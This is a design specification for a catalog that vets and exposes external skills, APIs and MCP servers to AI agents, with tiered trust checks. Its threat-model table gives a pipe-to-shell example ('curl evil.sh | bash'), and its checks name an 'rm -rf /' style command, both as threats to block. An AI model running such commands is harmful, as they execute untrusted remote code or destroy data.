# Katalog — Skills, APIs, MCPs Catalog

**Status**: design (brainstorming + recon complete, pre-plan)
**Date**: 2026-05-09 (recon 2026-05-11; brainstorm sweep 2026-05-14)
**Owner**: KutAI core

## Problem

KutAI's i2p (idea-to-product) workflow burns LLM iterations on tasks that have well-known recipes — auth wiring, scaffolds, CRUD, RAG setup, deploy steps. Existing skill subsystem (`src/memory/skills.py`) auto-grows tiny prompt-injection routing hints from successful tasks but cannot import external recipes. Public skill libraries (anthropics/skills, obra/superpowers, wshobson agents, MetaGPT roles, cookiecutter ecosystem) carry far more leverage than current internal hints — but no infrastructure exists to fetch, vet, store, and *correctly* expose them.

Free APIs registry (`src/tools/free_apis.py`) and MCP server discovery face the same shape of problem: external artifacts need discovery, vetting, indexing, exposure to agents, effectiveness telemetry. Today each is bespoke or absent.

Two gaps surfaced in v1 review and a real-world recon (`docs/superpowers/specs/2026-05-11-katalog-recon.md`) reshape this design:

1. **Vetting at scale** — naive "per-artifact human approve" gate collapses under realistic discovery volumes (public-apis ~1.4k, awesome-mcp-servers ~1k, github_topic open-ended). Need tiered classifier + auto-checks + source-scout-with-founder-curate pattern.
2. **Exposure rework** — pure "match → inject text / register tool" path leaves the leverage on the floor. Real benefit requires multiple exposure classes (preempt / prebind / tool / context / role_swap / rubric / sandbox / quarantine), each plugged into the right host (mr_roboto / coulson / fatih_hoca).

## Goals

- Lazy fetch + apply external recipes per mission (no wholesale registry vendoring)
- Vetted catalog with auditable trust chain at multiple granularities (source / owner / artifact / check)
- Pluggable sources (extensible across registries)
- Unified lifecycle for skills, APIs, MCPs (and future artifact types)
- Recipes that can fast-forward whole scaffolding processes via mechanical preempt
- Skills that act as finish-gate rubrics, agent role swaps, or pre-bound concrete actions — not just inert text
- Autonomous source-scout + founder-curate flow: KutAI watches the world, founder swipes proposals

## Non-goals (v1)

- Migrating `src/tools/free_apis.py` onto the framework (audit + migrate separately; framework must fit it but not gate on it)
- Mid-mission *trust elevation* (artifacts queued mid-mission still wait for next planning sweep before activation)
- Headless-browser scraping for ClawHub / SkillHub (catalogs unscrapeable today)
- Public distribution of KutAI-authored skills
- LLM-assisted prompt-injection vetting beyond regex scan (v1.1)

## Locked design decisions (brainstorm output)

### Threat model

Ranked for KutAI's surface (local Windows, shell + file + git push + cloud-API tokens + Telegram identity):

| Threat | Severity | Frequency | Strategy |
|---|---|---|---|
| Malicious shell (`curl evil.sh \| bash`) | high | low | shell-bin allowlist + sandbox tier |
| Prompt injection (body hijacks agent) | high | low–med | regex scan + body-size cap + T3 on hit |
| Supply chain (compromised npm/docker) | high | low | sha256 pin on MCP install |
| Network exfil (api endpoint = attacker) | med | low | domain allowlist + `call_api` redaction (existing) |
| Quality rot (recipe wrong/outdated) | low | **high** | telemetry-driven auto-disable + source decay |
| License contamination | low | low | manifest field, no enforcement (KutAI is private) |

### Source granularity

`repo+path` is the unit (e.g. `github:anthropics/skills@/skills`). No commit-pinning by default. **Trust attaches to owner** separately from source — awesome-list adapters discover child artifacts under various owners; trust check is `child.owner ∈ trusted_owners` not `source.id ∈ trusted_sources`.

### Trust feedback

- Per-artifact: rolling success rate <30% over N invocations → `enabled=0` + Telegram nag
- Source-aggregate: weighted avg of artifact success rates per source → trust score drift; below threshold → source `pin_policy` bumps tighter, future bumps re-vet at T2 minimum
- Owner-aggregate: same for owner
- **Promotion always manual** via `/katalog source promote <id>` or `/katalog owner promote <name>` (no auto-trust-from-stars; stargazer is broken signal per recon)
- Vetted artifacts never deleted; can be re-enabled

### Discovery model

- **Cron** for trusted sources (curated, ~tens of artifacts/source)
- **On-demand** for untrusted catalogs (volume-dangerous; only pulled when demand signal fires)
- **Source-scout** runs autonomously, proposes new sources to founder via Telegram cards (never auto-adds sources)
- Per-source `discovery_mode ∈ {cron, on_demand, both}`, per-source rate limit, per-day candidate cap

### Demand signals (when to fire on-demand discovery)

Two tiers, both feed same `DemandSignal` queue with confidence stacking + dedupe by `source_step_pattern` (embedding-hashed) + cooldown:

**Proactive** (decision boundaries, primary driver):
1. **Planning sweep** — i2p workflow expands a mission, matcher runs per step during expansion; gaps trigger fetch before any agent runs
2. **Step entry** — matcher runs at step start; below-θ on recipe-eligible step fires on-demand query
3. **Agent tool-callable** — `katalog.check(intent)` exposed as ReAct tool; agent self-serves mid-iteration
4. **Founder-initiated** — `/katalog discover "<intent>"` ad-hoc

**Reactive** (backstop):
5. **Explicit `recipe_hint` miss** — step JSON carries `recipe_hint`; matcher finds nothing above τ
6. **DLQ** — step exhausted retries; signal "something is missing"
7. **Repeat-pattern across missions** — same embedded step description appears K times with no high-match score

Confidence stacks across signals; D+C+E on same pattern = high priority, single E alone = backlog.

### Tier classifier

Each artifact lands in one of T0..T3 via **owner-elevated source cap min-with checks**:

```
trust_cap = max(source_max, owner_max)        # owner elevates source
final_tier = min(trust_cap, *check_maxes)     # checks always cap; no elevation past checks
```

- `SOURCE_MAX[trusted]=T0, [review]=T1, [untrusted]=T2` — automated source-level trust
- `OWNER_MAX` per row in `katalog_owners`, founder-controlled
- Owner can **elevate** a sketchy source (B-style) only when founder has explicitly approved the owner via Telegram **after reading sample artifacts** that source-scout surfaced. KutAI never auto-promotes owners. The "read + approve" interaction is the source-scout card: founder sees sample manifests + bodies, taps `[Trust owner]`, all future sources from that owner inherit the elevation.
- Auto-checks still cap independently — owner elevation cannot bypass a failed shell_allowlist or injection_scan
- Audit row stored per vetting decision with each cap's contribution (`source_max`, `owner_max`, per-check max tiers)

Auto-checks (gate-zero, run on every artifact regardless of source trust):

| Check | Pass behavior | Fail behavior |
|---|---|---|
| schema_valid | T0 | T3 |
| body_size_ok (skill ≤50KB, hint ≤5KB) | T0 | T2 |
| shell_allowlist (first token in cmd) | T0 if known | T2 if unknown, T3 if blocked |
| network_scope (network endpoints only in `api` kind) | T0 | T1 if cross-kind |
| mcp_pinned (sha256 of npm tarball / docker digest) | T0 if pinned | T2 unpinned |
| injection_scan (regex set) | T0 | T3 on hit |
| license_present | T0 | T2 |
| diff_size (re-fetch) | T0 if first or <30% body change | T1 medium, T2 large |
| windows_compat (chmod/sudo/apt/raw .sh/symlink) | T0 | T2 (mechanizable=false), T3 if `rm -rf /` style |

Tier → exposure ceiling (matcher floors based on task confidence):

| Tier | Eligible exposure classes |
|---|---|
| T0 | preempt, prebind, tool, context, role_swap, rubric |
| T1 | prebind, tool, context, rubric (no preempt, no role_swap) |
| T2 | sandbox, context-with-warning |
| T3 | quarantine only |

### Auto-check policy ownership

DB-only (no static YAML), seeded by migration. KutAI proposes additions via `katalog_policy_proposals` table; founder approves via Telegram. Same pattern across all lists: shell_allowlist, domain_allowlist, injection_regexes, mcp_pin_policy. Audit row per change.

### Exposure classes (8 total)

| Class | When | Mechanism | Host |
|---|---|---|---|
| `preempt` | T0 + mechanizable + match ≥ θ_hard | beckman routes task to mechanical lane; mr_roboto runs `executor.run_recipe`; LLM never called | matcher → beckman → mr_roboto |
| `prebind` | T0/T1 + parametric template + match ≥ θ_med | matcher binds inputs from task ctx; emits concrete suggested call (not menu) | matcher |
| `tool` | T1 + match ≥ θ_low | register as ad-hoc tool for this task only; not in global tool list | matcher → coulson |
| `context` | match ≥ θ_min | inject as hint text in context (legacy `skills.find_relevant_skills` path) | matcher → coulson |
| `role_swap` | `kind=agent_config` + match ≥ θ_hard | fatih_hoca replaces agent sys_prompt + tool list for this step; honors `model_hint` | matcher → fatih_hoca |
| `rubric` | `kind=prompt_skill` with checklist | inject as **post-execution** check at finish-gate, not pre-execution context; skill becomes verifier | coulson finish-gate (G grounding) |
| `sandbox` | T2 anything | tool wrapped in dry-run executor; first invocation produces diff, founder approves | mr_roboto |
| `quarantine` | T3 | never exposed | — |

### Prebind mechanism (the leverage class)

Per-step pre-hook, multi-tier short-circuits to bound cost:

```
1. matcher.match(step) → ranked hits  [vector + score, no LLM]
2. for each hit ≥ θ:
   a. compute exposure_class from (tier × kind × confidence)
   b. if class needs bound args (prebind, preempt):
        - try static bind_from paths first → fill from task_ctx
        - if all fields filled: done, no LLM
        - if any null: check bind_cache (embedding-keyed)
        - if cache hit ≥ 0.92: reuse args
        - else: beckman.enqueue(BindTask, await_inline, lane=overhead)
              → small model (Haiku-tier), constrained decode against inputs_schema
              → return bound_args dict (may still have nulls; defaults fill)
3. emit chosen exposure (bound suggested call, tool, context inject, …)
```

Cost ladder:
- Most steps: no matcher hit → 0 LLM
- Hit + all-static-bindable: 0 LLM
- Hit + cache hit: 0 LLM (vector lookup only)
- Hit + cold partial-static cache-miss: 1 small LLM call (~280 tokens)

Planning sweep pre-warms cache → step-entry stalls minimal. Async beckman.enqueue fires N binds in parallel during expansion, all overhead lane, no swap thrash.

### Manifest synthesis (most artifacts in the wild lack katalog format)

Recon finding: 99% of public artifacts ship their own native format (SKILL.md frontmatter, cookiecutter.json, README bullets, table rows). Katalog-format YAML with `inputs_schema.foo.bind_from: [...]` is **internal** — adapters synthesize it.

**Hybrid seed + synthesis**:
- **Seed manifests** — hand-authored in `packages/katalog/seed/manifests/*.yaml` for top 20 known-good recipes (see Seed list below). T0, mechanizable=true where applicable, pristine `bind_from` paths.
- **Adapter parsers** for structured sources (anthropics SKILL.md frontmatter, cookiecutter.json, public-apis table rows) — mechanical, no LLM
- **LLM synthesis fallback** for unstructured sources (awesome-list bullets, freeform README) — Sonnet, ~700 tokens/artifact, ~$0.20–$1/month total at projected volume
- **Naming**: `name_original` preserves upstream raw name; `name` is canonical `<source-slug>-<original>` (with rules to avoid `matlab-matlab-live-script` style); matcher embeds BOTH

Synthesized artifacts default to T1/T2 (cannot reach T0 unless seed or canonical SKILL.md frontmatter source).

## Artifact types

| Type | Schema shape | Activation cost | Dominant exposure classes (per recon) |
|---|---|---|---|
| skill | manifest + body + assets | none | context, rubric, role_swap (prompt_skill dominant in wild) |
| api | endpoint + auth + rate_limit | none | tool (per-step budget cap ≤3) |
| mcp | server cmd + env + tool list | process lifecycle | tool (on-demand process start + idle shutdown) |

Skill kinds:
- `internal_hint` — auto-grown routing hint (current `skills.py` content); body inline
- `prompt_skill` — markdown SKILL.md (anthropics/obra convention); dominant kind in the wild
- `shell_recipe` — invocation steps (cookiecutter, npx scaffolds) + post-patch; rare in wild, mostly seeded
- `procedure` — ordered tool chain
- `agent_config` — sys_prompt + tool list + optional `model_hint` (wshobson/MetaGPT style)

## Architecture

### Package layout (mutable; firm at module-responsibility level)

```
packages/katalog/
  schema.py            # DB tables, manifest types
  contracts.py         # Plugin protocol (DiscoveryPlugin + AccessPlugin + SourceAdapter)
  trust.py             # source/owner allowlist, trust scoring, decay
  index.py             # read API for matcher
  matcher.py           # vector + hint match against unified index
  tier_classifier.py   # source-cap × check-caps → min-tier
  vetting/
    auto_checks.py     # 9 gate-zero checks
    policy.py          # DB-backed allowlists + proposal flow
    source_review.py   # collapsed per-source weekly digest
  exposure/
    preempt.py         # mr_roboto route
    prebind.py         # matcher arg-binding + bind cache
    rubric.py          # finish-gate plugin
    role_swap.py       # fatih_hoca sys_prompt swap
    sandbox.py         # dry-run wrapper
    context.py         # legacy inject path
    tool.py            # ad-hoc tool register
  executor.py          # kind-dispatch executor
  telemetry.py         # injection_count, success, latency, exposure-class A/B
  discovery/
    cron.py            # daily run (trusted sources)
    on_demand.py       # need-driven query
    source_scout.py    # autonomous candidate-source proposal
    fetch.py           # staging → vendor/ on approve
    synthesize.py      # adapter-parse + LLM-fallback manifest generation
    sources/
      github_path.py
      github_topic.py
      awesome_list_md.py
      cookiecutter_template.py  # NEW (per recon)
      public_apis_md.py
      web_markdown.py
      clawhub_api.py     # stub
  plugins/
    skill.py
    api.py
    mcp.py
  seed/
    manifests/         # hand-authored top-20 seed manifests
```

Subdirs are guidance; implementation may resplit if a cleaner cut emerges.

### Data model

**Disk** (`vendor/skills/<source>/<name>/v<version>/`):
- `manifest.yaml` — typed metadata (synthesized or seeded)
- `SKILL.md` or `body.md` — body (for skill artifact)
- `assets/` — optional helper files (scripts, templates)

**DB** (single unified index):

```sql
CREATE TABLE katalog_index (
  id INTEGER PRIMARY KEY,
  artifact_type TEXT NOT NULL,    -- 'skill' | 'api' | 'mcp'
  kind TEXT,                      -- skill sub-type; null for api/mcp
  source TEXT NOT NULL,           -- 'github:anthropics/skills@/skills'
  owner TEXT,                     -- 'anthropics' (separate from source for owner-allowlist)
  name TEXT NOT NULL,             -- canonical '<source-slug>-<original>'
  name_original TEXT,             -- upstream raw name (for user-query matching)
  version TEXT NOT NULL,
  manifest_path TEXT,             -- null for inline (internal_hint)
  body_excerpt TEXT,              -- first ~500 chars for embedding
  embedding BLOB,                 -- vector (multilingual-e5-base, 768d)
  vet_tier INTEGER,               -- 0..3
  exposure_class TEXT,            -- 'preempt'|'prebind'|'tool'|'context'|'role_swap'|'rubric'|'sandbox'|'quarantine'
  vet_state TEXT,                 -- legacy column kept for migration
  vet_hash TEXT,                  -- content hash at vetting time
  source_max INTEGER,             -- audit: source cap that fed final tier
  check_max_json TEXT,            -- audit: per-check max-tier results
  signature TEXT,                 -- detached sig or commit SHA
  mechanizable BOOLEAN,           -- gate for preemption
  model_hint TEXT,                -- agent_config: pass-through to fatih_hoca
  enabled BOOLEAN DEFAULT 1,
  created_at TIMESTAMP,
  vetted_at TIMESTAMP,
  UNIQUE(source, name, version)
);

CREATE TABLE katalog_usage (
  id INTEGER PRIMARY KEY,
  artifact_id INTEGER REFERENCES katalog_index(id),
  task_id TEXT,
  exposure_class TEXT,            -- which path actually fired
  bind_args_json TEXT,            -- for prebind, captured args
  exposed BOOLEAN,
  called BOOLEAN,
  succeeded BOOLEAN,
  latency_ms INTEGER,
  conflict_loser BOOLEAN,         -- role_swap collision: was outranked by sibling
  would_have_used INTEGER,        -- mid-mission escape: artifact id we wanted but couldn't wait for
  escape_reason TEXT,             -- 'awaiting_human' | 'rate_limited' | 'quota_exhausted' | 'hard_cap_10m'
  occurred_at TIMESTAMP
);

CREATE TABLE katalog_sources (
  id INTEGER PRIMARY KEY,
  source_id TEXT UNIQUE NOT NULL, -- 'github:anthropics/skills@/skills'
  source_type TEXT,               -- adapter name
  endpoint TEXT,
  auth_env TEXT,
  trust_score REAL DEFAULT 0.3,
  pin_policy TEXT DEFAULT 'minor',-- 'none' | 'minor' | 'major' | 'commit'
  discovery_mode TEXT DEFAULT 'on_demand',  -- 'cron' | 'on_demand' | 'both'
  trusted BOOLEAN,
  enabled BOOLEAN DEFAULT 1,
  last_run_at TIMESTAMP,
  min_interval_s INTEGER          -- rate limit between runs
);

CREATE TABLE katalog_owners (
  owner_id TEXT PRIMARY KEY,      -- 'anthropics', 'obra', 'wshobson', ...
  trust_score REAL DEFAULT 0.3,
  allowed_artifact_types TEXT,    -- JSON array
  source_count INTEGER,           -- denormalized: count of distinct sources from this owner
  rolling_success_rate REAL,      -- for decay
  notes TEXT
);

CREATE TABLE katalog_disabled_imports (
  id INTEGER PRIMARY KEY,
  source TEXT NOT NULL,
  artifact_name TEXT NOT NULL,
  reason TEXT,                    -- 'duplicates_vecihi' | 'self_ref' | 'win_incompat' | ...
  added_at TIMESTAMP,
  UNIQUE(source, artifact_name)
);

CREATE TABLE katalog_bind_cache (
  id INTEGER PRIMARY KEY,
  manifest_id INTEGER REFERENCES katalog_index(id),
  ctx_embedding BLOB,             -- embed(json of relevant task_ctx fields)
  bound_args_json TEXT,
  hit_count INTEGER DEFAULT 0,
  created_at TIMESTAMP,
  last_used_at TIMESTAMP
);

CREATE TABLE katalog_mcp_processes (
  artifact_id INTEGER PRIMARY KEY REFERENCES katalog_index(id),
  pid INTEGER,
  port INTEGER,
  started_at TIMESTAMP,
  last_used_at TIMESTAMP,
  idle_timeout_s INTEGER DEFAULT 300
);

CREATE TABLE katalog_policy (
  id INTEGER PRIMARY KEY,
  check_name TEXT NOT NULL,       -- 'shell_allowlist' | 'domain_allowlist' | 'injection_regex' | 'mcp_pin_policy'
  key TEXT NOT NULL,              -- e.g. 'wasp' for shell_allowlist
  value TEXT,                     -- 'allow' | 'deny' | regex pattern
  added_by TEXT,                  -- 'seed' | 'founder' | 'auto_proposal'
  added_at TIMESTAMP,
  UNIQUE(check_name, key)
);

CREATE TABLE katalog_policy_proposals (
  id INTEGER PRIMARY KEY,
  check_name TEXT NOT NULL,
  key TEXT NOT NULL,
  proposed_value TEXT,
  evidence_json TEXT,             -- artifacts observed, success counts, etc.
  state TEXT DEFAULT 'pending',   -- 'pending' | 'approved' | 'rejected'
  proposed_at TIMESTAMP,
  decided_at TIMESTAMP
);

CREATE TABLE katalog_source_candidates (
  id INTEGER PRIMARY KEY,
  candidate_source_id TEXT,
  source_type TEXT,
  endpoint TEXT,
  metadata_json TEXT,             -- description, sample artifact, stargazer count (informational only)
  state TEXT DEFAULT 'pending',
  proposed_at TIMESTAMP,
  decided_at TIMESTAMP
);

CREATE TABLE katalog_demand_signals (
  id INTEGER PRIMARY KEY,
  source_step_pattern TEXT,       -- embedding-hashed step signature
  intent_keywords_json TEXT,
  signal_type TEXT,               -- 'planning_miss' | 'step_entry_miss' | 'tool_call' | 'founder' | 'hint_miss' | 'dlq' | 'repeat_pattern'
  confidence REAL,
  fired_at TIMESTAMP,
  resulted_in_discovery BOOLEAN
);
```

### Manifest schema (manifest.yaml)

```yaml
name: cc-django                          # canonical
name_original: cookiecutter-django       # upstream raw
version: 1.0.0
artifact_type: skill
kind: shell_recipe
source: github:cookiecutter/cookiecutter-django
owner: cookiecutter
license: BSD-3-Clause
mechanizable: true
model_hint: null                          # for agent_config kinds
intent_keywords: [django, web-app, fullstack, celery, docker, postgresql]
inputs_schema:
  project_name:
    type: string
    bind_from: [task.parent_mission.payload.project_name, task.title]
  use_celery:
    type: bool
    bind_from: [task.parent_mission.payload.use_celery]
    default: false
invocation:
  steps:
    - cmd: "uvx cookiecutter gh:cookiecutter/cookiecutter-django"
artifacts: [manage.py, config/settings/base.py]
disabled_imports_check: true              # honor katalog_disabled_imports
```

Different `artifact_type` values use different optional sections. Plugin parses + validates.

### Plugin contract

```python
class DiscoveryPlugin(Protocol):
    artifact_type: str
    def parse_manifest(self, raw: bytes, source_meta: dict) -> Manifest: ...
    def vet_checks(self, manifest: Manifest, body_path: Path) -> list[Issue]: ...

class AccessPlugin(Protocol):
    artifact_type: str
    def expose_to_agent(self, row: IndexRow, task_ctx: TaskContext, exposure_class: str) -> Exposure: ...
    def execute(self, row: IndexRow, task_ctx: TaskContext, inputs: dict) -> Result: ...
    def bind_args(self, row: IndexRow, task_ctx: TaskContext) -> dict | None: ...    # prebind
    def as_rubric(self, row: IndexRow, output: str) -> list[Issue]: ...               # rubric
    def as_sys_prompt(self, row: IndexRow) -> str | None: ...                         # role_swap

class SourceAdapter(Protocol):
    source_type: str
    async def discover(self, source_cfg: SourceConfig) -> list[ArtifactRef]: ...
    async def fetch(self, ref: ArtifactRef) -> Path: ...
```

Plugins live in `katalog/plugins/<artifact>.py`. Default impls return None/[] so plugins opt into advanced exposures.

### Lifecycle

1. **Source-scout** (cron, autonomous)
   - Scans: GitHub trending in relevant topics, cross-refs in approved artifacts' READMEs, web search on accumulated demand signals, founder-mentioned URLs
   - Per-day candidate cap (default 5)
   - Output: row in `katalog_source_candidates` + Telegram card
2. **Source approval** (manual via Telegram)
   - Founder swipes approve-trusted / approve-untrusted / reject / defer
   - Approved → row in `katalog_sources` with appropriate `discovery_mode` + `trust_score`
3. **Discover**
   - Trusted sources: cron runs daily (or per `min_interval_s`)
   - Untrusted: triggered by demand signal (planning/step-entry/tool-call/founder/hint-miss/DLQ/repeat-pattern)
   - Per-source artifact-cap per run prevents first-run flood
4. **Fetch + synthesize**
   - Source adapter pulls into `vendor/skills/.staging/<source>/<name>/`
   - Adapter parses native format (frontmatter / json / table-row / bullet)
   - LLM synthesis fills gaps where parser can't (Sonnet, constrained-decode against manifest schema)
   - Compute content hash; check against `katalog_disabled_imports`
5. **Tier classify**
   - Run all auto-checks → collect per-check max tiers
   - Look up source_max + owner_max
   - `trust_cap = max(source_max, owner_max)`; `final_tier = min(trust_cap, *check_maxes)` (see Tier classifier section)
   - Audit row with each cap's contribution
6. **Enable**
   - T0/T1: auto-enable, move staging → `vendor/skills/<source>/<name>/v<version>/`
   - T2: sandbox-enable (callable but wrapped in dry-run); founder receives weekly digest review
   - T3: quarantine (`enabled=0`, never surface without `/katalog requeue`)
   - Embed body excerpt + intent_keywords → `katalog_index.embedding`
7. **Update**
   - Re-fetch creates `v<n+1>/`; full tier classify re-runs
   - Trusted-source minor bumps with small diff usually stay T0 (diff_size check passes)
   - Major bumps or large diff → re-tier, may demote
8. **Auto-disable**
   - `katalog_usage.succeeded` rolling rate <30% over N invocations → `enabled=0` + Telegram nag
   - Source trust score decays from artifact-aggregate failures → tighter pin_policy on next bump
   - Owner trust decays similarly
   - Vetted artifacts never deleted

### Match + dispatch (hot path)

Existing call site: `coulson/context.py:945` (currently `skills.find_relevant_skills`).

Replaced with `katalog.matcher.match(task) → list[Match]`:

1. **Vector + hint** — vector similarity over `katalog_index.embedding` (both `name`+`name_original` indexed); hint_bonus when step carries `recipe_hint`
2. **Score** — `confidence = vector_similarity × source_trust × owner_trust × hint_bonus`
3. **Per-step API budget** — for `artifact_type=api`, cap surfaced count at 3 (default, configurable). Unselected APIs invisible to agent → no tool soup.
4. **Branch on (tier × kind × confidence) → exposure_class**
   - T0 + shell_recipe + mechanizable + conf ≥ θ_preempt → `preempt`
   - T0/T1 + parametric + conf ≥ θ_prebind → `prebind` (run bind pipeline)
   - T0 + agent_config + conf ≥ θ_role → `role_swap` (fatih_hoca prepends sys_prompt + applies `model_hint`)
   - T0 + prompt_skill with checklist body → `rubric` (post-execution finish-gate)
   - T1 + match ≥ θ_low → `tool` (ad-hoc register, scoped to this step)
   - T2 + match → `sandbox`
   - Otherwise + match ≥ θ_min → `context` (legacy inject)
   - T3 → never surface
5. **Emit decision record** to `katalog_usage` with `exposure_class` + `bind_args_json` for telemetry / A/B

`θ_preempt > θ_prebind > θ_role > θ_low > θ_min`, tunable, per-source overrides allowed. Defaults conservative; lower based on success-rate telemetry.

**Multiple `role_swap` match conflict**: when 2+ `agent_config` artifacts score above `θ_role` on the same step, matcher picks highest-score deterministically; losers logged to `katalog_usage` with `exposed=false, conflict_loser=true`. `/katalog stats` surfaces an ambiguity report (top-K collision pairs per week) so founder can tune θ or disable the underperformer. No stacking, no fail-loud.

### API + MCP specifics (beyond shared lifecycle)

Most exposure-class machinery (preempt, prebind, role_swap, rubric) doesn't apply to api/mcp — they live almost entirely in `tool` exposure. Five api/mcp-specific behaviors required on top of base:

**1. Auth env-var lifecycle**

- Manifest declares `auth_env: <KEY>` (api) or `mcp.env_required: [KEY1, KEY2]` (mcp)
- At vet time: env presence check writes `env_status` column on `katalog_index` (`ready` | `missing_<KEY>`)
- At match time: artifacts with `env_status != ready` are filtered from hits (skip silently with telemetry note)
- Founder visibility: `/katalog auth missing` lists artifacts blocked by missing env; `/katalog auth set <KEY>=<VALUE>` writes to katalog-secret table (encrypted at rest via fernet, key in `.env`) and triggers re-vet on affected artifacts
- Periodic re-check (daily cron) catches founder adding env vars manually to `.env`

**2. MCP manifest schema fields**

`artifact_type: mcp` carries a dedicated section:

```yaml
artifact_type: mcp
name: mcp-cloudflare
mcp:
  transport: stdio              # 'stdio' | 'sse' | 'streamable_http'
  install_cmd: "npm install -g mcp-server-cloudflare"  # one-shot, optional
  run_cmd: "npx -y mcp-server-cloudflare"
  env_required: [CLOUDFLARE_API_TOKEN]
  port_hint: null               # for sse/http; null = stdio
  tools_static: []              # known tool names if not dynamic
  tools_discover: true          # call list_tools on first start
  health_check: list_tools      # which call to probe; 'list_tools' default
  idle_timeout_s: 300
```

**3. Tool-name namespacing**

When katalog registers a tool with coulson/agent context, name format = `<artifact_slug>__<tool>` (double underscore):
- `mcp_cloudflare__list_workers`, `mcp_cloudflare__deploy_worker`
- `skill_cc_django__scaffold` (for skill `tool` exposure)
- `api_coingecko__price` (for api `tool` exposure with manifest-declared verbs)

Collisions impossible across artifacts; logs identify provenance unambiguously. Dispatcher routes by prefix.

**4. Per-MCP tool budget cap**

MCP server can expose many tools (Cloudflare MCP: 20+). Without cap, tool soup returns. Same model as api per-step budget:
- Matcher picks ≤ K_mcp_tools tools per (step, mcp_server) (default K=3)
- Selection: embed each tool's description; rank by similarity to step intent; expose top-K
- Discovered tool descriptions cached in `katalog_mcp_tools` table on first list_tools call
- Per-step total cap across all MCPs = K_mcp_total (default 6)

**5. MCP health-probe**

- On MCP start: run probe call (`mcp.health_check`, default `list_tools`) within 5s timeout
- Failure → mark `health='unhealthy'` in `katalog_mcp_processes`, kill process, don't expose tools; Telegram nag
- Success → `health='ready'`, expose selected tools per (4)
- Periodic re-probe every 60s while running; consecutive 3 fails → restart attempt; consecutive 5 fails → mark artifact disabled until founder intervenes
- `/katalog mcp status` — running servers + health + last_probe_at + tool_count
- `/katalog mcp restart <id>` / `kill <id>` — manual controls

Aligns with `no_auto_connect` rule: no MCP starts at KutAI boot. Matcher-triggered start only.

**Additional schema**:

```sql
ALTER TABLE katalog_index ADD COLUMN env_status TEXT DEFAULT 'ready';  -- 'ready' | 'missing_<KEY>'
ALTER TABLE katalog_mcp_processes ADD COLUMN health TEXT DEFAULT 'starting';  -- 'starting' | 'ready' | 'unhealthy'
ALTER TABLE katalog_mcp_processes ADD COLUMN last_probe_at TIMESTAMP;
ALTER TABLE katalog_mcp_processes ADD COLUMN consecutive_probe_fails INTEGER DEFAULT 0;

CREATE TABLE katalog_mcp_tools (
  id INTEGER PRIMARY KEY,
  artifact_id INTEGER REFERENCES katalog_index(id),
  tool_name TEXT NOT NULL,
  description TEXT,
  description_embedding BLOB,
  input_schema_json TEXT,
  first_seen_at TIMESTAMP,
  UNIQUE(artifact_id, tool_name)
);

CREATE TABLE katalog_secrets (
  id INTEGER PRIMARY KEY,
  key_name TEXT UNIQUE NOT NULL,
  encrypted_value BLOB,           -- fernet, key in .env KATALOG_SECRET_KEY
  added_at TIMESTAMP,
  last_used_at TIMESTAMP
);
```

### Mid-mission demand-signal timing (Lock 1)

When step-entry (#2) or agent-tool-call (#3) fires demand signal mid-mission and discovery+vet must complete before the artifact can be used:

- **Default**: step **stalls** until artifact ready. Few-minute waits are cheap compared to burning LLM iterations on a missing recipe.
- **Escape A — `awaiting_human`**: pipeline state hits T2 escalation queue (founder approval needed for that artifact). Don't stall; step proceeds without recipe, artifact queued for next mission's planning sweep.
- **Escape B — `rate_limited` / `quota_exhausted`**: GitHub API rate limit, overhead-lane quota burn, etc. Don't stall; queue for next mission.
- **Hard cap**: 10 minutes wall-clock regardless of state. Step proceeds without recipe (failsafe).
- **Telemetry**: when step proceeds via escape or cap, log to `katalog_usage` with `would_have_used=<artifact_id>, escape_reason=<state>`. Post-mortem can see missed-leverage cases.

Planning-sweep (#1) demand signals never stall a step (they fire during expansion, before agent starts). Founder-initiated (#4) is interactive — founder waits on `/katalog discover` directly.

### Source adapters (6, not 5)

| Adapter | Sources | Parser | Confidence |
|---|---|---|---|
| `github_path` | anthropics/skills, obra/superpowers, wshobson/agents, matlab/skills | YAML-frontmatter mechanical | 0.95 |
| `github_topic` | topic-search results | mechanical list + LLM per-artifact | 0.6 |
| `awesome_list_md` | awesome-mcp-servers, awesome-agent-skills | regex-bullet + LLM-normalize | 0.55 |
| `public_apis_md` | public-apis/public-apis | table-parser mechanical | 0.9 |
| `cookiecutter_template` | individual cookiecutter repos | `cookiecutter.json` parse | 0.85 |
| `web_markdown` | generic SKILL.md URL | frontmatter mechanical | 0.9 |
| `clawhub_api` | future | stub | n/a |

Recon finding: `awesome-cookiecutter` README is 404-rotted. v1 drops it; seed cookiecutter templates manually (3 in seed list).

### Telegram UX

- `/katalog` — overview: counts by tier/type, vet queue depth, demand-signal backlog, source-candidate queue
- `/katalog sources pending` — source-scout proposals: candidate card with metadata + sample artifact + `[Trust]` `[Untrust]` `[Reject]` `[Defer]`
- `/katalog review <source>` — collapsed weekly digest of new/updated artifacts from a source as single decision
- `/katalog pending` — per-artifact T2 escalations (rare, only when artifact triggers escalation)
- `/katalog policy add <check> <key>` / `/katalog policy review` — policy proposals from KutAI observation; founder approves
- `/katalog disable <id>` / `/katalog enable <id>` / `/katalog requeue <id>` (for T3)
- `/katalog source promote <id> <tier>` / `/katalog owner promote <name>` — manual trust promotion
- `/katalog stats` — A/B per exposure class (preempt vs prebind vs tool vs context vs rubric vs role_swap), success rates per source/owner
- `/katalog discover "<intent>"` — founder-initiated demand signal (#4)
- `/katalog scout <url>` — founder-mentioned candidate source
- `/katalog auth missing` — artifacts blocked by missing env vars
- `/katalog auth set <KEY>=<VALUE>` — write to katalog-secret table (encrypted) and re-vet affected artifacts
- `/katalog mcp status` — running MCP servers + health + tool counts
- `/katalog mcp restart <id>` / `/katalog mcp kill <id>` — manual MCP process control

### Wiring into existing KutAI

- **`coulson/context.py`** — replace `skills.find_relevant_skills` with `katalog.matcher.match`. Internal hints stay (flow through unified matcher).
- **`coulson/finish_gate.py`** — register `rubric` exposure plugin hook (G grounding pattern); when matched rubric artifact attached to step, run `as_rubric(row, output)` at finish-gate.
- **`mr_roboto`** — add `run_recipe` action delegating to `katalog.executor.run_recipe`; add `sandbox_run` action for T2 dry-run wrapping.
- **`general_beckman`** — scheduled jobs: `katalog.discovery.cron.daily_run()`, `katalog.discovery.source_scout.scan()`, `katalog.exposure.prebind.warm_cache()` (planning-time pre-warm). Recipe-lane routing: when matcher returns `preempt`, beckman routes task to mechanical lane with `runner=katalog_recipe`. `BindTask` overhead-lane handler routes through dispatcher with constrained decode.
- **`fatih_hoca`** — add katalog query in sys_prompt-build path; when matched `role_swap` artifact, prepend `as_sys_prompt(row)` + honor `model_hint`.
